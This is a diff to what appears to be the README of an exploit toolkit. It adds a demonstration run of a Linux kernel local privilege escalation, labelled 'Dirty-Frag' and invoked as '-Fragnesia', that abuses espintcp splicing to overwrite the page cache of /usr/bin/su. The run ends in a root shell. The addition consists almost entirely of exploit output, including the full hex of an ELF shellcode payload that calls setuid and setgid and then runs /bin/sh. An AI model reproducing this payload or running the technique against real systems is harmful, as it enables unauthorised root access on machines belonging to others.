@@ -269,3 +269,72 @@ user@debian:~/fullEx$ ./fullEx.sh -DirtyFrag
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+## 💀 Dirty-Frag
+
+```
+user@debian:~/fullEx$ ./fullEx.sh -Fragnesia
+[*] uid=1000 euid=1000 gid=1000 egid=1000
+[*] mode=xfrm_espintcp_pagecache_replace collateral=after
+
+[*] target=/usr/bin/su size=55672
+outer_write_open_denied=1 errno=13 (Permission denied)
+userns_setup: outer_uid=1000 outer_gid=1000 ns_uid=0 ns_gid=0
+netns_setup=1
+loopback_up=1
+xfrm_espintcp_state_add=1
+namespace_setup_complete=1
+userns_root_mapped_to_outer_user_write_open_denied=1 errno=13 (Permission denied)
+
+[*] timing: rx_pre_ulp=30000us tx_pre_splice=1000us rx_post_ulp=30000us
+[*] range: offset=0x0 len=192 last=0xbf enc_len=4080 splice_len=4096
+[*] union: transformed=0x0-0x10ae collateral_after=0xc0-0x10ae
+[*] payload=7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000b800000000000000b800000000000000001000000000000031ff31f631c0b06a0f05b0690f05b0740f056a00488d0512000000504889e2488d3d1200000031f66a3b580f055445524d3d787465726d002f62696e2f7368000000000000000000
+
+stream0_table_entries=256
+
+[*] smashing 192 bytes into read-only page cache  changed=174  skipped=18  remaining=0
+  0000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00 
+  0010  02 00 3e 00 01 00 00 00  78 00 40 00 00 00 00 00 
+  0020  40 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 
+  0030  00 00 00 00 40 00 38 00  01 00 00 00 00 00 00 00 
+  0040  01 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00 
+  0050  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00 
+  0060  b8 00 00 00 00 00 00 00  b8 00 00 00 00 00 00 00 
+  0070  00 10 00 00 00 00 00 00  31 ff 31 f6 31 c0 b0 6a 
+  0080  0f 05 b0 69 0f 05 b0 74  0f 05 6a 00 48 8d 05 12 
+  0090  00 00 00 50 48 89 e2 48  8d 3d 12 00 00 00 31 f6 
+  00a0  6a 3b 58 0f 05 54 45 52  4d 3d 78 74 65 72 6d 00 
+  00b0  2f 62 69 6e 2f 73 68 00  00 00 00 00 00 00 00 00 
+  [==================================================] 192/192 (100%)
+────────────────────────────────────────────────────────────
+
+[*] verifying 192 bytes...byte=9a
+[*] bytes_flip_summary len=192 changed=174 skipped=18
+[+] BUG: changed requested copied byte range to desired values
+ firing espintcp splice...
+sender_ns_uid=0 euid=0 prefix_send=18 splice_to_tcp=4096 file_off=189 file_off_next=4285
+receiver_ns_uid=0 euid=0 espintcp_enabled_after_queue=1
+sender_status=0 receiver_status=0
+[+] smashed 9a -> 00  index=189 offset=+00bd
+
+byte_flip_nonce=17 stream_byte=39
+byte_flip_packet_iv=cccccccc00000011
+[*] [191/192] +00be  39 -> 00  xor=39 seq=174 nonce=17
+ firing espintcp splice...
+sender_ns_uid=0 euid=0 prefix_send=18 splice_to_tcp=4096 file_off=190 file_off_next=4286
+receiver_ns_uid=0 euid=0 espintcp_enabled_after_queue=1
+sender_status=0 receiver_status=0
+[+] smashed 39 -> 00  index=190 offset=+00be
+
+byte_flip_nonce=778 stream_byte=ce
+byte_flip_packet_iv=cccccccc0000030a
+[*] [192/192] +00bf  ce -> 00  xor=ce seq=175 nonce=778
+ firing espintcp splice...
+sender_ns_uid=0 euid=0 prefix_send=18 splice_to_tcp=4096 file_off=191 file_off_next=4287
+receiver_ns_uid=0 euid=0 espintcp_enabled_after_queue=1
+sender_status=0 receiver_status=0
+[+] smashed ce -> 00  index=191 offset=+00bf
+
+# id    
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+```
